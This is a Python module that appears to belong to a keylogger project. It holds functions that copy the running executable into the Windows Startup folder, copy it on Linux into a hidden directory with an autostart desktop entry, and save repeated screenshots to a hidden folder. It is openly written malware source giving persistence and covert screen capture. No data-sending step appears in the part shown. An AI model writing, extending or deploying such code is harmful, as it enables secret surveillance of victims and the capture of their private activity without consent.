import os
import shutil
import sys

import PIL as ImageGrab
from constants import (
    AUTOSTART_CONTENT,
    AUTOSTART_DIR,
    DUPLICATE_EXE_DIR,
    DUPLICATE_NAME_FILE,
    IMG_DIR,
    IMG_FILE,
)


def is_windows():
    """
    https://stackoverflow.com/questions/1854/how-to-identify-which-os-python-is-running-on
    https://stackoverflow.com/questions/1325581/how-do-i-check-if-im-running-on-windows-in-python

    Check if the current operating system is Windows.

    Returns:
        - bool: True if the current operating system is Windows, False otherwise.
    """
    return os.name == 'nt'


def create_autostart_entry():
    """
    Creates an autostart entry based on the operating system.
    """
    if is_windows():
        create_autostart_entry_win()
    else:
        create_autostart_entry_linux()


def create_autostart_entry_win():
    """
    https://stackoverflow.com/questions/33178838/python-code-for-program-to-add-itself-to-start-up-windows

    Creates an autostart entry for the application in windows systems.
    """
    aup = os.environ.get("ALLUSERSPROFILE")
    up = os.environ.get("USERPROFILE")

    if aup and up:
        script_folder = os.path.dirname(os.path.abspath(sys.argv[0]))
        source_path = os.path.join(script_folder, sys.executable)
        destination_path = os.path.join(up, "AppData", "Roaming", "Microsoft",
                                        "Windows", "Start Menu", "Programs",
                                        "Startup", DUPLICATE_NAME_FILE)

        # Check if the file is already in the startup folder
        if not os.path.exists(destination_path):
            shutil.copy2(
                source_path,
                destination_path)  # Preserves the original file metadata.
            print(
                f"File '{DUPLICATE_NAME_FILE}' moved to startup folder successfully."
            )
        else:
            print(
                f"File '{DUPLICATE_NAME_FILE}' is already in the startup folder."
            )
    else:
        print("Oops, couldn't look up stuff in os.environ")


def create_autostart_entry_linux():
    """
    Creates an autostart entry for the application in linux systems and also duplicates the keylogger to a hidden directory.
    """
    duplicate_dir = os.path.expanduser(DUPLICATE_EXE_DIR)

    if not os.path.exists(duplicate_dir):
        os.makedirs(duplicate_dir)

    current_script = sys.executable

    duplicate_script_path = os.path.join(duplicate_dir, DUPLICATE_NAME_FILE)

    if not os.path.isfile(duplicate_script_path):
        shutil.copyfile(current_script, duplicate_script_path)
        os.chmod(duplicate_script_path, 0o755)

    autostart_path = os.path.expanduser(AUTOSTART_DIR)
    if not os.path.exists(autostart_path):
        os.makedirs(autostart_path)

    desktop_entry_path = os.path.join(autostart_path,
                                      f'{DUPLICATE_NAME_FILE}.desktop')

    # Check if the desktop entry file already exists
    if not os.path.exists(desktop_entry_path):
        with open(desktop_entry_path, 'w') as desktop_entry_file:
            desktop_entry_file.write(AUTOSTART_CONTENT)

        print(f'Autostart entry created at: {desktop_entry_path}')
    else:
        print(f'Autostart entry already exists at: {desktop_entry_path}')


def take_screenshot():
    """
    Takes a screenshot and saves it as a PNG file in the specified directory.

    Returns:
        - True if the screenshot is successfully taken and saved.
        - False if an exception occurs during the process.

    Raises:
        - Exception: If an error occurs while taking or saving the screenshot.
    """
    try:
        img_dir = IMG_DIR
        if is_windows():
            # Get the path to the user's "Documents" directory
            documents_dir = os.path.join(os.path.expanduser('~'), 'Documents')

            # Define the name of the hidden directory
            hidden_dir_name = IMG_DIR

            # Create the full path to the hidden directory
            img_dir = os.path.join(documents_dir, hidden_dir_name)

        if not os.path.exists(img_dir):
            os.makedirs(img_dir)
            print("Directory {} created successfully!".format(img_dir))

        image_number = 1
        while os.path.isfile(
                os.path.join(img_dir,
                             '{}{}.png'.format(IMG_FILE, image_number))):
            image_number += 1

        im = ImageGrab.grab()
        image_name = os.path.join(img_dir,
                                  '{}{}.png'.format(IMG_FILE, image_number))
        im.save(image_name, 'png')
        print("Image saved successfully at:", image_name)

        return im
    except Exception as e:
        print(e)
        return None
